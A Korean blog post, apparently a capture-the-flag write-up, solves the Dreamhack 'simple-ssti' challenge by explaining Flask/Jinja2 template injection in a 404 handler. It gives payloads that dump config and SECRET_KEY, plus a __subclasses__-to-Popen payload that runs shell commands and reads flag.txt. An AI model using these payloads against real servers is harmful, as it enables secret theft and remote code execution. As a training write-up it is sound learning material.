---
title: (2) Dreamhack simple-ssti 문제 풀이
date: 2024-01-07 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
존재하지 않는 페이지 방문시 404 에러를 출력하는 서비스입니다.  
SSTI 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.

## SSTI
일단 ssti는 공격자가 서버의 기본 템플릿 구문을 이용하여 악성 페이로드를 삽입하여 서버에서 실행되도록 하는 취약점을 말합니다. 예를 들자면 이런겁니다.  
index.html을 이렇게 구성하고
```html
<html>
  <body>
    <h1>{{1+2}}</h1>
  </body>
</html>
```
Flask로 서버를 띄워보면
![](https://kyuyeop.github.io/assets/img/post/2/1.png)
이렇게 3이라는 값이 출력되는 걸 볼 수 있습니다. 참고로 근본은 `{{7*7}}`입니다만 식상해서...  
만약 사용자의 입력값을 별도의 처리 없이 그대로 사이트에 반영시킨다면 사용자가 특정 구문을 입력함으로서 서버에 원격명령을 실행하도록 할 수 있겠죠.  

그럼 이제 문제를 풀어봅시다.

## 문제 풀이
빠르게 코드부터 확인해봅시다.
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, render_template_string, make_response, redirect, url_for
import socket

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

app.secret_key = FLAG


@app.route('/')
def index():
    return render_template('index.html')

@app.errorhandler(404)
def Error404(e):
    template = '''
    <div class="center">
        <h1>Page Not Found.</h1>
        <h3>%s</h3>
    </div>
''' % (request.path)
    return render_template_string(template), 404

app.run(host='0.0.0.0', port=8000)
```
코드에서는 존재하지 않는 페이지로 접속했을때 즉, 404 에러 페이지가 뜰때 경로에 따라 어떤 페이지가 존재하지 않는지 알려주는 기능이 구현되어 있습니다.  
request.path를 그대로 넣어버리기 때문에 ssti 취약점이 발생합니다. 앞에서 처럼 {{1+2}}가 작동하는지 확인하기 위해 /{{1+2}} 를 입력해 보면
![](https://kyuyeop.github.io/assets/img/post/2/2.png)
이렇게 1+2가 계산되어 3이 출력되는 걸 볼 수 있습니다. 

그러면 flag를 얻으려면 뭘 입력해야할까요?  
바로 /{{config}} 입니다. 12번째 줄에 보면
```python
app.secret_key = FLAG
```
이런 구문이 있습니다. secret_key가 flag로 들어가 있는 상태이니 secret_key를 알아내면 됩니다.  
flask는 대부분의 정보가 config로 들어가게 됩니다. 따라서 {{config}}를 삽입하게 된다면 secret_key를 포함한 각종 정보들이 나옵니다. 

실제로 입력해보면
![](https://kyuyeop.github.io/assets/img/post/2/3.png)
이렇게 SECRET_KEY가 출력됩니다. 만약 SECRET_KEY만 얻고 싶다면 {{config.SECRET_KEY}}를 입력하면 됩니다.
![](https://kyuyeop.github.io/assets/img/post/2/4.png)
오늘은 이렇게 ssti 취약점과 dreamhack의 simple-ssti 문제를 풀어보았습니다.  
템플릿 엔진은 서버마다 사용하는게 다를 수 있으니 염두에 두셔야 합니다.  

끝으로 어떻게 원격 명령을 내릴 수 있는지도 알아보도록 하겠습니다.  
가장 널리 알려진 방법은 subprocess.Popen을 이용합니다.
```python
{{''.__class__.__mro__[1].__subclasses__()[408]('cat flag.txt',shell=True,stdout=-1).communicate()}}
```
먼저 '' 즉, str의 class를 가져오고 \_\_mro__를 이용해 상속 받는 클래스를 가져옵니다. 여기서는 2번째 클래스인 object를 받아옵니다.  
그리고 object의 subclasses를 가져와서 확인해보면 409번째가 subprocess.Popen 입니다. 이건 사용하는 파이썬 버전 마다 다를 수 있으니 슬라이싱을 통해 직접 찾아보셔야 합니다.  
이후에는 파이썬의 subProcess.Popen 처럼 쓰면 됩니다. 실제로 입력하면
![](https://kyuyeop.github.io/assets/img/post/2/5.png)
이렇게 flag가 나옵니다.  

이번에는 간단하게 flag만 출력해 보았지만 얼마든지 전체 권한을 가져올 수 있을 겁니다. 원한다면 리버스 쉘도 얻을 수 있습니다.  
다양한 페이로드들이 이미 알려져 있으니 관심있으면 한번 찾아보시면 도움 될겁니다.
{% endraw %}